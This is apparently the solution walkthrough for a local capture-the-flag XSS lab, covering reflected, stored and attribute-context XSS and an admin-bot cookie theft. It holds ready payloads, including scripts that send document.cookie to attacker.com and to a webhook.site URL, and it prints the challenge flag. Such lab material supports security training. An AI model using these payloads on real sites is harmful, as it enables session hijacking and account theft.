CHALLENGE 1: Reflected XSS (Search)
------------------------------------
  The /search endpoint renders the query with Markup() bypassing
  Jinja2 auto-escaping:

  http://localhost:5002/search?q=<script>alert('XSS')</script>

  Alternative payloads:
    ?q=<img src=x onerror=alert(document.cookie)>
    ?q=<svg onload=alert(1)>

-------------------------------------------------------------------------------

CHALLENGE 2: Stored XSS (Comments)
------------------------------------
  The /post/<id>/comment endpoint stores comments without sanitization.
  Comments are rendered with the |safe filter in templates.

  curl -X POST http://localhost:5002/post/1/comment \
    -d "username=hacker&content=<script>document.location='http://attacker.com/?c='+document.cookie</script>"

  When any user views the post, the script executes and sends
  their cookies to the attacker.

-------------------------------------------------------------------------------

CHALLENGE 3: DOM XSS (Profile)
------------------------------------
  The /profile/<id> endpoint renders display_name with |safe in
  an HTML attribute context. User 1 (admin) has display_name "Admin<User>"
  which demonstrates how unsanitized output can break attribute context.

  Visit: http://localhost:5002/profile/1

-------------------------------------------------------------------------------

CHALLENGE 4: Cookie Theft via Admin Bot
Flag: FLAG{xss_c00kie_st34l}
------------------------------------

  This is the main flag challenge. The workflow is:

  STEP 1 — Plant a Stored XSS payload
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Post a comment on any forum post containing a script that exfiltrates
  cookies to your webhook.site URL.

  Go to https://webhook.site and copy your unique URL (e.g.
  https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx).

  Then post a comment:

    curl -X POST http://localhost:5002/post/1/comment \
      -d "username=hacker" \
      -d "content=<script>document.location='https://webhook.site/YOUR-UUID?c='+document.cookie</script>"

  Or via the web UI: go to any post, enter a username, and paste this
  as the comment:

    <script>document.location='https://webhook.site/YOUR-UUID?c='+document.cookie</script>

  STEP 2 — Report the page URL to the admin bot
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Go to http://localhost:5002/report and submit the URL of the post
  that contains your XSS payload:

    http://localhost:5002/post/1

  Or via curl:

    curl -X POST http://localhost:5002/report \
      -H "Content-Type: application/json" \
      -d '{"url":"http://localhost:5002/post/1"}'

  STEP 3 — The admin bot visits the page
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  The server-side admin bot fetches the page with the admin cookie:

    Cookie: session=admin_secret_session_token_FLAG{xss_c00kie_st34l}

  It detects the <script> tag (XSS indicator) in the HTML, finds the
  webhook.site URL in the payload, and simulates the XSS firing by
  sending the admin cookie to your webhook.site endpoint as a query
  parameter.

  STEP 4 — Check webhook.site for the flag
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Go back to https://webhook.site and look at the incoming request.
  You will see:

    GET /?cookie=session%3Dadmin_secret_session_token_FLAG%7Bxss_c00kie_st34l%7D

  URL-decoded, the cookie value is:

    session=admin_secret_session_token_FLAG{xss_c00kie_st34l}

  The flag is: FLAG{xss_c00kie_st34l}
